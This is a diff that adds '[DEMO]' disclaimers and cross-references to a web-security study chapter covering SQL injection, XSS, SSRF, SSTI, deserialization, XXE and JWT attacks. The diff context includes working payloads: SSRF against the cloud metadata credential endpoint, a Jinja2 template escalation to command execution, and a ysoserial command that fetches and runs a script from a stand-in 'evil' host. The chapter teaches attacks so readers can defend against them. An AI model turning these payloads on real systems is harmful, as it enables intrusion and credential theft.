@@ -276,6 +276,8 @@ The SQL parser cannot tell which part the programmer intended as "data" — the 
 
 ### 5.3.2. Exploitation techniques (by type, with concrete payloads)
 
+`[DEMO]` The payloads below only illustrate the exploitation mechanism; do NOT use them directly in production.
+
 **(a) UNION-based** — used when the response displays the query data.
 
 `UNION SELECT` appends an additional result set. Requirement: the same number of columns and compatible types. Step 1, probe the column count using `ORDER BY` increasing until it errors:
@@ -397,6 +399,8 @@ Note: a prepared statement CANNOT parameterize table/column names or keywords (`
 | **DOM-based** | A client-side source (`location.hash`...) | Does not go through the server | Client JS writes data into the DOM unsafely |
 
 ### 5.4.2. Concrete payloads and request/response
+
+`[DEMO]` The XSS payloads below only illustrate the mechanism; do NOT use them directly in production.
 
 **Reflected** — an endpoint that reflects `q`:
 
@@ -554,7 +558,7 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
 
 ### 5.6.1. The classic target: Cloud metadata
 
-On AWS EC2 (IMDSv1), the metadata endpoint returns temporary credentials:
+On AWS EC2 (IMDSv1), the metadata endpoint returns temporary credentials (see also [Chapter 13 — Cloud Security](#sec-13) on metadata/IMDS):
 
 ```
 http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
@@ -567,7 +571,7 @@ url = request.args['image_url']
 resp = requests.get(url)        # attacker passes url=http://169.254.169.254/...
 ```
 
-Payload:
+Payload `[DEMO]` (illustrates the mechanism only):
 ```http
 POST /fetch-image HTTP/1.1
 Content-Type: application/json
@@ -697,11 +701,11 @@ subprocess.run(["ping", "-c", "1", host], shell=False, timeout=5)
 from jinja2 import Template
 Template("Hello " + request.args['name']).render()
 ```
-Detection payload (Jinja2):
+Detection payload `[DEMO]` (illustrates the mechanism only) — Jinja2:
 ```
 name={{7*7}}      → renders "49"  ⇒ the template engine is evaluating the expression
 ```
-Escalation payload to RCE (Jinja2/Python):
+Escalation payload to RCE `[DEMO]` (Jinja2/Python):
 ```
 {{ ''.__class__.__mro__[1].__subclasses__() }}      # enumerate classes
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
@@ -735,7 +739,7 @@ A Java serialized object begins with fixed magic bytes:
 
 The Base64 of a Java stream usually begins with `rO0AB...` (which is `0xACED0005` encoded in base64) — a tell-tale indicator in logs / for Blue Teams. A gadget chain (e.g. via the Commons Collections library) exploits a sequence of `readObject()` calls cascading to `Runtime.exec()`.
 
-Payload-generation tool — **ysoserial**:
+Payload-generation tool — **ysoserial** `[DEMO]` (illustrates the mechanism only):
 ```bash
 java -jar ysoserial.jar CommonsCollections5 'curl http://evil/c|sh' > payload.bin
 # Send payload.bin to the insecure deserialization endpoint
@@ -766,6 +770,8 @@ payload = pickle.dumps(E())     # send it to a server to unpickle
 ## 5.11. A05 — XML External Entity (XXE)
 
 **What it is:** An XML parser allows defining **entities** that point to external resources; if enabled, the attacker can read internal files or trigger SSRF.
+
+`[DEMO]` The XXE payload below only illustrates the mechanism; do NOT use it directly in production.
 
 ```xml
 <?xml version="1.0"?>
@@ -857,6 +863,8 @@ The session ID must be cryptographically random (≥128 bits of entropy). After 
 
 ### 5.14.2. JWT — JSON Web Token (RFC 7519)
 
+(Cross-reference: the cryptographic foundations of the HS256/RS256 signatures are in [Chapter 4](#sec-04).)
+
 **Structure.** A JWT = three Base64URL parts joined by `.`:
 ```
 <Header>.<Payload>.<Signature>
@@ -888,6 +896,8 @@ Base64URL differs from standard Base64: `+`→`-`, `/`→`_`, padding `=` droppe
 - RS256: `RSASSA-PKCS1-v1_5 + SHA-256`, the private key signs and the public key verifies — asymmetric.
 
 ### 5.14.3. JWT attacks
+
+`[DEMO]` The attack payloads/commands below only illustrate the mechanism; do NOT use them directly in production.
 
 **(a) `alg: none`.** Some older libraries accept `alg=none`, meaning "no signature needed." The attacker edits the payload, sets `alg:none`, and drops the signature part:
 ```
@@ -1107,3 +1117,10 @@ Missing logs/monitoring let attacks go undetected. You should log: successful/fa
 ---
 
 *End of Chapter 5.*
+
+
+---
+
+## My notes
+
+> *Personal notes: points I previously misunderstood, areas I'm still exploring, or lessons from hands-on practice — updated over time.*
